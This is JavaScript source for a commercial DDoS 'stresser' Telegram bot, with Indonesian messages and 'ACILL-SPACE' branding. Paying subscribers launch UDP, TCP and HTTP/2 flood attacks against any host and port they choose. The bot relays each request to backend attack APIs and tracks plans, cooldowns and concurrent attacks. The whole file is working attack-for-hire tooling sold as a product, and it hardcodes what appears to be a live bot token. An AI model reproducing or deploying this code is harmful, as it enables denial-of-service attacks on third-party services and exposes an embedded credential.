const TelegramBot = require('node-telegram-bot-api');
const fs = require("fs");
const os = require('os');
const axios = require("axios");
const hai = require('moment-timezone');
const moment = require('moment');
const CONFIG = require('./config'); 

const TOKEN = "7603173849:AAG3Z2gwgyhV9TIJphNhT7usVOC_75GF49s";
const ADMIN_ID = "1987642016"; 

const network = new TelegramBot(TOKEN, { polling: true });

const USERS_FILE = './data/users.json'; 
const API_FILE = './data/methods.json'

const isOwner = (userId) => userId == ADMIN_ID;

const daftarFilePath = './data/daftar.json';

if (!fs.existsSync(daftarFilePath)) {
    fs.writeFileSync(daftarFilePath, '[]');
}

const daftar = JSON.parse(fs.readFileSync(daftarFilePath, 'utf8'));

async function isChannelMember(userId) {
    try {
        const chatMember = await network.getChatMember(`@densus24`, userId); 
        return ['member', 'administrator', 'creator'].includes(chatMember.status);
    } catch (error) {
        console.error(`Gagal memeriksa keanggotaan untuk user ${userId}: ${error.message}`);
        return false; 
    }
};

function getUserDetails(userId) {
    try {
        const usersData = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
        const userDetails = usersData.find(user => user.userId === userId.toString());
        
        if (!userDetails) {
            return false; 
        }
        
        return userDetails;
    } catch (error) {
        console.error('Error getting user details:', error);
        return false;
    }
};

function getMethodDetails(attackType) {
    try {
        const methodsData = JSON.parse(fs.readFileSync(API_FILE, 'utf8'));
        
        const method = methodsData[attackType];
        
        if (!method) {
            console.error(`Metode ${attackType} tidak ditemukan dalam methods.json`);
            return null;
        }
        
        return method;
    } catch (error) {
        console.error('Kesalahan saat membaca metode:', error);
        return null;
    }
};

async function canUseCommand(userId, commandType) {
    try {
        const usersFilePath = './data/users.json'; 
        const attacksFilePath = './data/attacks.json';
        
        const usersData = JSON.parse(await fs.promises.readFile(usersFilePath, 'utf8'));
        
        const now = Date.now();
        
        const userPlan = usersData.find(user => 
            user.userId === userId && 
            new Date(user.expiry).getTime() > now 
        );
        
        if (!userPlan) {
            return {
                allowed: false,
                remainingTime: 0,
                message: "Akses Anda telah berakhir. Silakan perpanjang."
            };
        }

        if (!global.commandCooldowns) {
            global.commandCooldowns = {};
        }
        if (!global.userCommandTracking) {
            global.userCommandTracking = {};
        }

        const lastCommandKey = `${userId}_${commandType}`;
        const currentTime = Date.now();

        const concurrent = userPlan.concurrent; 
        
        let attacksData = [];
        try {
            attacksData = JSON.parse(await fs.promises.readFile(attacksFilePath, 'utf8'));
        } catch (error) {
            console.error('Gagal membaca file serangan:', error);
        }

        const ongoingAttacks = attacksData.filter(attack => {
            const attackEndTime = new Date(attack.timestamp).getTime() + (attack.time * 1000);
            return attack.userId === userId && attackEndTime > currentTime;
        });

        if (ongoingAttacks.length >= concurrent) {
            return {
                allowed: false,
                remainingTime: 0,
                message: `Anda sudah mencapai batas maksimal ${concurrent} serangan`
            };
        }

        const lastCommandTime = global.commandCooldowns[lastCommandKey];
        const cooldownPeriod = userPlan.cooldown * 1000; 
        
        if (lastCommandTime) {
            const remainingCooldown = cooldownPeriod - (currentTime - lastCommandTime);
            
            if (remainingCooldown > 0) {
                const remainingSeconds = Math.ceil(remainingCooldown / 1000);
                return {
                    allowed: false,
                    remainingTime: remainingSeconds,
                    message: `Mohon tunggu ${remainingSeconds} detik sebelum menggunakan metode ini lagi.`
                };
            }
        }
        
        global.commandCooldowns[lastCommandKey] = currentTime;
        
        return {
            allowed: true,
            remainingTime: 0,
            message: "Perintah diizinkan."
        };
    } catch (error) {
        console.error('Error checking command usage:', error);
        return {
            allowed: false,
            remainingTime: 0,
            message: "Terjadi kesalahan saat memeriksa akses."
        };
    }
};

async function checkConcurrentAttacks(userId, maxConcurrent) {
    try {
        const attacksFilePath = './data/attacks.json';
        const currentTime = new Date();

        let attacksData = [];
        try {
            attacksData = JSON.parse(fs.readFileSync(attacksFilePath, 'utf8'));
        } catch (error) {
            console.error('Gagal membaca file serangan:', error);
            return { blocked: false };
        }

        const ongoingAttacks = attacksData.filter(attack => {
            const attackStartTime = new Date(attack.startTime);
            const attackEndTime = new Date(attack.endTime);
            return (
                attack.userId === userId && 
                currentTime >= attackStartTime && 
                currentTime <= attackEndTime
            );
        });

        return {
            blocked: ongoingAttacks.length >= maxConcurrent,
            currentAttacks: ongoingAttacks.length,
            maxConcurrent: maxConcurrent
        };

    } catch (error) {
        console.error('Kesalahan saat memeriksa concurrent attacks:', error);
        return { blocked: false };
    }
};

async function sendAttackResponse(chatId, target, port, time, attackType, attackResult) {
    try {
        await network.sendAnimation(chatId, 'https://files.catbox.moe/oopw97.jpg', {
            caption: `<code><i>Serangan berhasil dikirim</i></code>

<code>🎯 Target: ${target}</code>
<code>🎛️ Port: ${port}</code>
<code>⏳ Durasi: ${time} detik</code>
<code>🚀 Methods: ${attackType}</code>`,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Check host', url: `https://check-host.net/check-http?host=${target}` },
                        { text: 'Ongoing', callback_data: 'ongoing' }
                    ]
                ]
            },
            parse_mode: 'HTML' 
        });
    } catch (error) {
        console.error('Error sending attack response:', error);
    }
};

function checkMethodPermission(userDetails, method) {
    return method.permission[userDetails.status] || false;
};

async function processAttack(method, target, port, time, userId) {
    const endpoints = method.api.url.split(',').map(url => url.trim());
    
    if (!endpoints || endpoints.length === 0) {
        throw new Error("Tidak ada server yang terdaftar");
    }

    const attackResults = [];
    
    for (const baseUrl of endpoints) {
        try {
            const apiUrl = baseUrl
                .replace('{host}', target)
                .replace('{port}', port.toString())
                .replace('{time}', time.toString());

            console.log(`[API REQUEST] Mengirim request ke: ${apiUrl}`); // Log URL yang dikirim
            
            const response = await axios.get(apiUrl, { timeout: 5000 });
            
            // Tambahkan detail respon ke hasil
            attackResults.push({
                endpoint: baseUrl,
                status: response.status,
                data: response.data,
                success: true
            });
            
            console.log(`[API RESPONSE] Berhasil:`, response.data); // Log respon sukses
        } catch (error) {
            console.error(`[API ERROR] Gagal pada endpoint ${baseUrl}:`, error.message);
            
            attackResults.push({
                endpoint: baseUrl,
                status: error.response?.status || 500,
                data: error.response?.data || error.message,
                success: false
            });
        }
    }

    const successfulRequests = attackResults.filter(result => result.success).length;
    
    return {
        successfulRequests: successfulRequests,
        totalEndpoints: endpoints.length,
        details: attackResults // Tambahkan detail respon untuk ditampilkan
    };
};
async function notifyAdmin(msg, target, port, time, attackType) {

    const userDetails = getUserDetails(msg.from.id);

    const adminMessage = `ATTACK ALERT 

Users Details:
• Username: @${msg.from.username || 'Unknown'}
• User ID: ${msg.from.id}
• User Status: ${userDetails ? userDetails.status : 'Tidak Dikenal'}

Target Information:
• Host: ${target}
• Port: ${port}

Attack Specifications:
• Method: ${attackType}
• Duration: ${time} detik
• Timestamp: ${moment().format('YYYY-MM-DD HH:mm:ss')}
`;

    const actionButtons = [
        [
            { text: 'Cek Target', url: `https://check-host.net/check-http?host=${target}` },
            { text: 'Ongoing', callback_data: 'ongoing'}
        ]
    ];

    try {
        await network.sendMessage(ADMIN_ID, adminMessage, {
            reply_markup: {
                inline_keyboard: actionButtons
            }
        });
    } catch (error) {
        console.error('Gagal mengirim notifikasi admin:', error);
    }
};

async function logAttack(attackData) {
    const logFilePath = './data/attacks.json';
    try {

        let logs = [];
        try {
            logs = JSON.parse(fs.readFileSync(logFilePath, 'utf8'));
        } catch (readError) {
            console.error('Error reading attacks file:', readError);
            logs = []; 
        }

        logs.push({
            ...attackData,
            timestamp: new Date().toISOString()
        });

        if (logs.length > 1000) {
            logs = logs.slice(-1000);
        }

        try {
            fs.writeFileSync(logFilePath, JSON.stringify(logs, null, 2));
        } catch (writeError) {
            console.error('Error writing attacks file:', writeError);
        }
    } catch (error) {
        console.error('Gagal mencatat log serangan:', error);
    }
};

async function commandHandler(msg, attackType, args) {
    const userId = msg.from.id.toString();
    const chatId = msg.chat.id;

    try {
        const isMember = await isChannelMember(userId);
        if (!isMember) {
            return network.sendMessage(chatId, 'Join My Group For Use🚀', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Join Group🚀', url: `https://t.me/densus24` }]
                    ]
                }
            });
        }

        // Validasi argumen
        if (args.length !== 3) {
            return network.sendMessage(chatId, `🟡 Format salah. Gunakan: /${attackType.toLowerCase()} <target> <port> <time>`);
        }
        
        const target = args[0].trim(); 
        const port = parseInt(args[1]);
        const time = parseInt(args[2]);
        
        if (!target) {
            return network.sendMessage(chatId, "Input Target");
        }
        
        // Validasi port
        if (isNaN(port) || port < 1 || port > 65535) {
            return network.sendMessage(chatId, "❌️ Port harus berupa angka antara 1-65535.");
        }
        
        // Validasi waktu
        if (isNaN(time) || time <= 0) {
            return network.sendMessage(chatId, "❌️ Waktu harus berupa angka positif.");
        }

        // Baca data metode
        const method = await getMethodDetails(attackType);
        if (!method) {
            return network.sendMessage(chatId, `❌️ Metode ${attackType} tidak ditemukan.`);
        }

        // Validasi detail pengguna
        const userDetails = getUserDetails(userId);
        if (!userDetails) {
            return network.sendMessage(chatId, "❌️ Anda tidak terdaftar sebagai pengguna.");
        }

        // Cek izin berdasarkan status
        if (!checkMethodPermission(userDetails, method)) {
            return network.sendMessage(chatId, `❌️ Anda tidak diizinkan menggunakan metode ${attackType}.`);
        }

        // Validasi durasi maksimum
        if (time > method.maxDuration) {
            return network.sendMessage(chatId, `❌️ Durasi maksimum yang diizinkan adalah ${method.maxDuration} detik.`);
        }

        // Cek concurrent attacks
        const concurrentAttacks = await checkConcurrentAttacks(userId, userDetails.concurrent);
        if (concurrentAttacks.blocked) {
            return network.sendMessage(chatId, `❌ Anda sudah mencapai batas, maksimal ${userDetails.concurrent} serangan`);
        }

        // Cek penggunaan perintah
        const accessResult = await canUseCommand(userId, attackType);
        if (!accessResult.allowed) {
            return network.sendMessage(chatId, `❌ ${accessResult.message}`);
        }

        // Proses serangan
        const attackResult = await processAttack(method, target, port, time, userId);

        const attackLogData = {
            userId: userId,
            username: msg.from.username || 'Unknown',
            target: target,
            port: port,
            time: time,
            method: attackType,
            ...attackResult,
            startTime: new Date().toISOString(),
            endTime: new Date(Date.now() + time * 1000).toISOString()
        };
        await logAttack(attackLogData);

        await sendAttackResponse(chatId, target, port, time, attackType, attackResult);

        if (userId !== ADMIN_ID) {
            await notifyAdmin(msg, target, port, time, attackType);
        }

    } catch (error) {
        console.error('Kesalahan fatal pada command handler:', error);
        network.sendMessage(chatId, "❌️ Terjadi kesalahan saat memproses serangan.");
    }
};

let currentPage = 0;
const itemsPerPage = 2; 
const items = [
    [
        { text: 'Attack Menu', callback_data: 'ddos' },
        { text: 'Profile', callback_data: 'plans' }
    ],
    [
        { text: 'Methods', callback_data: 'methods' },
        { text: 'Ongoing', callback_data: 'ongoing' }
    ],
    [
        { text: 'Owner access', callback_data: 'owner_akses' },
        { text: 'All Plans', callback_data: 'all_plans' }
    ],
];

function getButtons(page) {
    const buttons = [];
    const start = page * itemsPerPage;
    const end = start + itemsPerPage;
    const currentItems = items.slice(start, end);

    currentItems.forEach(rowItems => {
        buttons.push(rowItems);
    });

    const navButtons = [];
    if (page > 0) {
        navButtons.push({ text: 'Previous', callback_data: 'prev' });
    }
    if (end < items.length) {
        navButtons.push({ text: 'Next', callback_data: 'next' });
    }

    if (navButtons.length > 0) {
        buttons.push(navButtons);
    }

    return buttons;
};

network.onText(/\/start/, async (msg) => {
    const userId = msg.from.id;
    const isMember = await isChannelMember(userId);
    const username = msg.from.username || 'User ';
    const time2 = hai().tz('Asia/Jakarta').format('HH:mm:ss');
    let ucapanWaktu;

    if (time2 < "03:00:00") {
        ucapanWaktu = 'Selamat Tengah Malam.';
    } else if (time2 < "05:00:00") {
        ucapanWaktu = 'Selamat Subuh.';
    } else if (time2 < "10:00:00") {
        ucapanWaktu = 'Selamat Pagi.';
    } else if (time2 < "15:00:00") {
        ucapanWaktu = 'Selamat Siang.';
    } else if (time2 < "18:00:00") {
        ucapanWaktu = 'Selamat Sore.';
    } else if (time2 < "19:00:00") {
        ucapanWaktu = 'Selamat Petang.';
    } else {
        ucapanWaktu = 'Selamat Malam.';
    }

    if (!isMember) {
        return network.sendMessage(msg.chat.id, 'Please ensure you have joined the group before using this bot.', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Join Group', url: `https://t.me/densus24` }]
                ]
            }
        });
    }

    const ownerDetails = `<code>Selamat Datang di ACILL-SPACE</code>`;
    const displayMenu = `<code>⚡ Selamat Datang di ACILL-SPACE</code>`;

    const buttons = getButtons(currentPage);

     network.sendAnimation(msg.chat.id, 'https://files.catbox.moe/oopw97.jpg', {
        caption: displayMenu,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: buttons }
    });
});

network.on('callback_query', async (callback) => {
    const { data, message, from } = callback;
    const userId = from.id;
    const username = from.username || 'User';
    
    let caption = ''; 
    let buttons = [
        [{ text: 'Kembali ke Menu Utama', callback_data: 'back_to_main' }]
    ];

    const isMember = await isChannelMember(userId);

    if (!isMember) {
        return network.answerCallbackQuery(callback.id, {
            text: 'Join My Channel For Use🚀',
            show_alert: true
        });
    }

    if (data === 'next' || data === 'prev') {
        if (data === 'next' && (currentPage + 1) * itemsPerPage < items.length) {
            currentPage++;
        } else if (data === 'prev' && currentPage > 0) {
            currentPage--;
        }

    const ownerDetails = `<code>Welcome To Zodiāc Stresser</code>`;
    const displayMenu = `<code>⚡ Welcome To Zodiāc Stresser</code>`;

        buttons = getButtons(currentPage);

        network.editMessageCaption(caption, {
            chat_id: message.chat.id,
            message_id: message.message_id,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: buttons }
        });

        return network.answerCallbackQuery(callback.id);
    };
//SCRIPT by KAVERNXYZ
    
    if (data === 'all_plans') {
        if (!isOwner(from.id)) {
            return network.answerCallbackQuery(callback.id, {
                text: '❌️ Access denied, Owner only.',
                show_alert: true
            });
        }

        let usersData;
        try {
            usersData = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
        } catch (error) {
            return network.sendMessage(msg.chat.id, "❌️ Gagal membaca data pengguna.");
        }

        if (usersData.length === 0) {
            caption = "📭 Tidak ada pengguna yang terdaftar.";
        } else {
            const plansList = usersData.map((user, index) => {
                return `${index + 1}. User ID: ${user.userId}\nStatus: ${user.status}\nConcurrant: ${user.concurrent}\nMax Duration: ${user.maxDuration} seconds\nCooldown: ${user.cooldown} seconds\nStart Date: ${user.startDate}\nExpired: ${user.expiry}\n`;
            }).join('\n');
            caption = `📋 Daftar Plans:\n\n${plansList}`;
        }
    } else if (data === 'owner_akses') {
        if (isOwner(from.id)) {
            caption = `<b>👑 Owner Menu</b>\n\n` +
          `➤ <code>/addplans</code> - Add a new plan\n` +
          `➤ <code>/delplans</code> - Delete an existing plan`;

        } else {
            return network.answerCallbackQuery(callback.id, {
                text: '❌️ Access denied, Owner only.',
                show_alert: true
            });
        }
    } else if (data === 'plans') {
        const userDetails = getUserDetails(from.id); 
        if (userDetails) {
            caption = `<b>🔍 Your Profile</b>\n\n` +
          `👤 <b>Name:</b> <code>${username}</code>\n` +
          `🆔 <b>User ID:</b> <code>${userId}</code>\n` +
          `⏳ <b>Max Duration:</b> <code>${userDetails.maxDuration} seconds</code>\n` +
          `🔄 <b>Concurrent Attacks:</b> <code>${userDetails.concurrent}</code>\n` +
          `⏲️ <b>Cooldown:</b> <code>${userDetails.cooldown} seconds</code>\n` +
          `📌 <b>Status:</b> <code>${userDetails.status}</code>`;

        } else {
            return network.answerCallbackQuery(callback.id, {
                text: '❌️ You do not have active access.',
                show_alert: true
            });
        }
    } else if (data === 'ddos') {
        const userDetails = getUserDetails(from.id); 
        if (userDetails) {
            caption = `<b>🛡️ DDoS Attack Menu</b>\n\n` +
          `<b>Penggunaan:</b> <code>/method &lt;target&gt; &lt;port&gt; &lt;time&gt;</code>\n` +
          `<b>Contoh:</b> <code>/tls example.com 443 60</code>\n\n` +
          `📌 <b>Max Duration:</b> <code>${userDetails.maxDuration} seconds</code>\n` +
          `⏳ <b>Cooldown:</b> <code>${userDetails.cooldown} seconds</code>`;
        } else {
            return network.answerCallbackQuery(callback.id, {
                text: '❌️ You do not have active access.',
                show_alert: true
            });
        }
    } else if (data === 'methods') {
        const userDetails = getUserDetails(from.id); 
        if (userDetails) {
            caption = `<b>⚡ Attack Methods List</b>\n\n` +
          `${userDetails.allowedMethods.map(method => `• <code>${method}</code>`).join('\n')}`;


        } else {
            return network.answerCallbackQuery(callback.id, {
                text: '❌️ You do not have active access.',
                show_alert: true
            });
        }
    } else if (data === 'ongoing') {
        const userDetails = getUserDetails(from.id); 
        if (userDetails) {
            let attacksData;
            try {
                attacksData = JSON.parse(fs.readFileSync('./data/attacks.json', 'utf8'));
            } catch (error) {
                console.error("Gagal membaca data serangan:", error);
                return network.sendMessage(message.chat.id, "❌️ Gagal membaca data serangan.");
            }
        
            const currentTime = new Date();
        
            const ongoingAttacks = attacksData.filter(attack => {
                const attackEndTime = new Date(attack.timestamp);
                attackEndTime.setSeconds(attackEndTime.getSeconds() + (attack.time || 0)); 
        
                return attack.userId === from.id.toString() && currentTime < attackEndTime; 
            });
        
            const updatedAttacks = attacksData.filter(attack => {
                const attackEndTime = new Date(attack.timestamp);
                attackEndTime.setSeconds(attackEndTime.getSeconds() + (attack.time || 0));
                return currentTime < attackEndTime; 
            });
        
            try {
                fs.writeFileSync('./data/attacks.json', JSON.stringify(updatedAttacks, null, 2));
            } catch (error) {
                console.error('Gagal memperbarui file serangan:', error);
            }
        
            if (ongoingAttacks.length > 0) {
	    caption = `<b>🔥 Ongoing Attacks</b>\n\n` +
          `${ongoingAttacks.map((attack, index) => {
              const startTime = new Date(attack.timestamp);
              const endTime = new Date(startTime);
              endTime.setSeconds(endTime.getSeconds() + (attack.time || 0));

              const now = new Date();
              const elapsedTime = Math.floor((now - startTime) / 1000);
              const remainingTime = Math.max(0, (attack.time || 0) - elapsedTime);

              return `⚡ <b>Attack ${index + 1}:</b>\n` +
                     `📌 <b>Method:</b> <code>${attack.method || 'Unknown'}</code>\n` +
                     `🎯 <b>Target:</b> <code>${attack.target}</code>\n` +
                     `🎛️ <b>Port:</b> <code>${attack.port}</code>\n` +
                     `⏳ <b>Duration:</b> <code>${attack.time} seconds</code>\n` +
                     `⏲️ <b>Time Left:</b> <code>${remainingTime} seconds</code>\n`;
          }).join('\n')}`;

            } else {
        caption = "🛑 <b>There are no ongoing attacks.</b>";  
            }
        } else {
            return network.answerCallbackQuery(callback.id, {
                text: '❌️ You do not have active access.',
                show_alert: true
            });
        }
    } else if (data === 'back_to_main') {
    const ownerDetails = `<code>Welcome To Zodiāc Stresser</code>`;
    const displayMenu = `<code>⚡ Welcome To Zodiāc Stresser</code>`;
        buttons = getButtons(currentPage)
    }

    network.editMessageCaption(caption, {
        chat_id: message.chat.id,
        message_id: message.message_id,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: buttons }
    });
});

network.onText(/\/addplans(?: (.+))?/, (msg, match) => {
    const userId = msg.from.id.toString();
    
    if (!isOwner(userId)) {
        return network.sendMessage(msg.chat.id, "❌️ Anda tidak memiliki izin.");
    }

    if (!match[1]) {
        return network.sendMessage(msg.chat.id, "🟡 Format salah. Gunakan: /addplans <id> <status> <days> <concurrent>");
    }

    const [id, status, days, concurrent] = match[1].trim().split(' ');

    const validStatuses = ['Vip', 'Basic']; 
    if (!validStatuses.includes(status)) {
        return network.sendMessage(msg.chat.id, "🟡 Status tidak valid. Gunakan: Vip atau Basic.");
    }

    const parsedDays = parseInt(days, 10);
    const parsedConcurrent = parseInt(concurrent, 10);
    
    if (isNaN(parsedDays) || parsedDays <= 0) {
        return network.sendMessage(msg.chat.id, "🟡 Jumlah hari harus angka positif.");
    }

    if (isNaN(parsedConcurrent) || parsedConcurrent <= 0) {
        return network.sendMessage(msg.chat.id, "🟡 Jumlah concurrent harus angka positif.");
    }

    let usersData;
    try {
        usersData = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    } catch (error) {
        return network.sendMessage(msg.chat.id, "❌️ Gagal membaca data pengguna.");
    }

    const existingUser = usersData.find(user => user.userId === id);
    if (existingUser) {
        return network.sendMessage(msg.chat.id, `🟡 User ID ${id} sudah ada.`);
    }

    const startDate = moment().toISOString(); 
    const expiryDate = moment().add(parsedDays, 'days').toISOString(); 

    const newUser = {
        userId: id,
        status: status,
        maxDuration: status === 'VIP' ? 300 : 150, // Max duration untuk Vip 300, Basic 150
        cooldown: status === 'VIP' ? 80 : 120, // Cooldown untuk Vip 80, Basic 120
        concurrent: parsedConcurrent, // Tambahkan jumlah concurrent
    allowedMethods: status === 'VIP' ? 
        ["h2-jouma", "h2-acil", "udp-acil", "tcp-acil", "acil-space"] : // Metode untuk status Vip
        ["h2-jouma", "h2-acil", "udp-acil", "tcp-acil", "acil-space"], // Metode untuk status Basic
    startDate: startDate,   
    expiry: expiryDate      
};


    usersData.push(newUser);

    fs.writeFileSync(USERS_FILE, JSON.stringify(usersData, null, 2));

    network.sendMessage(msg.chat.id, `✔️ User ID ${id} berhasil ditambahkan:
• Status: ${status}
• Durasi: ${days} hari
• Concurrent: ${concurrent}
• Mulai: ${moment(startDate).format('DD MMMM YYYY')}
• Berakhir: ${moment(expiryDate).format('DD MMMM YYYY')}`);
});

network.onText(/\/delplans(?: (.+))?/, (msg, match) => {
    const userId = msg.from.id.toString();
    
    if (!isOwner(userId)) {
        return network.sendMessage(msg.chat.id, "❌️ Anda tidak memiliki izin.");
    }

    if (!match[1]) {
        return network.sendMessage(msg.chat.id, "🟡 Format salah. Gunakan: /delplans <id>");
    }

    const id = match[1].trim();

    let usersData;
    try {
        usersData = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    } catch (error) {
        return network.sendMessage(msg.chat.id, "❌️ Gagal membaca data pengguna.");
    }

    const userIndex = usersData.findIndex(user => user.userId === id);
    if (userIndex === -1) {
        return network.sendMessage(msg.chat.id, `🟡 User ID ${id} tidak ditemukan.`);
    }

    usersData.splice(userIndex, 1);

    fs.writeFileSync(USERS_FILE, JSON.stringify(usersData, null, 2));

    network.sendMessage(msg.chat.id, `✔️ User ID ${id} berhasil dihapus.`);
});

const attackMethods = [
    { command: '/h2-jouma', method: 'H2-JOUMA' },
    { command: '/h2-acil', method: 'H2-ACIL' },
    { command: '/udp-acil', method: 'UDP-ACIL' },
    { command: '/acil-space', method: 'ACIL-SPACE' },
    { command: '/tcp-acil', method: 'TCP-ACIL' },
    
];

attackMethods.forEach(({ command, method }) => {
    network.onText(new RegExp(`${command} (.+)`), (msg, match) => {
        const args = match[1].split(' ');
        commandHandler(msg, method, args);
    });
});

const colors = {
    primary: '\x1b[36m', 
    secondary: '\x1b[32m', 
    success: '\x1b[32m', 
    reset: '\x1b[0m' 
};

const style = {
    bold: '\x1b[1m'
};

const info = [
    "Creator: Bots",
];

const messages = [
    "Yow, thanks banget buat kalian...",
    "thanks bat udah beli script ini..."
];

const centerText = (text) => {
    const width = process.stdout.columns;
    const padding = Math.max(0, Math.floor((width - text.length) / 2));
    return ' '.repeat(padding) + text;
};

let index = 0;
const displayInfoWithEffect = () => {
    const interval = setInterval(() => {
        if (index < info.length) {
            console.log(centerText(colors.primary + info[index] + colors.reset));
            index++;
        } else {
            clearInterval(interval);
            // Anda dapat memanggil fungsi lain di sini jika diperlukan
        }
    }, 300);
};

const typeWriter = () => {
    let messageIndex = 0;
    let charIndex = 0;
    let currentText = '';

    const typingEffect = () => {
        if (messageIndex < messages.length) {
            if (charIndex < messages[messageIndex].length) {
                currentText += messages[messageIndex][charIndex];
                process.stdout.write('\x1b[H\n\n\n\n' + centerText(colors.primary + style.bold + currentText + style.reset));
                charIndex++;
                setTimeout(typingEffect, 150);
            } else {
                currentText += ' '; 
                charIndex = 0; 
                messageIndex++; 
                setTimeout(typingEffect, 200); 
            }
        } else {
            console.log('\n');
            clearScreen().then(animateLoader); 
        }
    };

    typingEffect(); 
};

const animateLoader = () => {
    const frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
    let frameIndex = 0;

    const interval = setInterval(() => {
        const paddingLines = Math.floor((process.stdout.rows - 1) / 2);
        const text = `${colors.secondary}${frames[frameIndex]} Launching bot...${colors.reset}`;
        const safePaddingLines = Math.max(0, paddingLines || 0);
        console.log(`\x1b[H\n${'\n'.repeat(safePaddingLines)}` + centerText(text));
        frameIndex = (frameIndex + 1) % frames.length;
    }, 100);

    setTimeout(() => {
        clearInterval(interval);
        clearScreen().then(() => {
            const message = `${colors.success}   ✨  Bot Has Been Launched! ✨   \n\n\n${colors.reset}`;
            let currentMessage = '';
            let i = 0;

            const typingEffect = setInterval(() => {
                if (i < message.length) {
                    currentMessage += message[i];
                    console.log('\x1b[H\n\n\n\n' + centerText(currentMessage));
                    i++;
                } else {
                    clearInterval(typingEffect);
                    displayInfoWithEffect(); 
                }
            }, 100); 
        });
    }, 5000);
};

const clearScreen = () => {
    return new Promise((resolve) => {
        process.stdout.write('\x1bc'); 
        resolve();
    });
};

console.clear();
typeWriter();
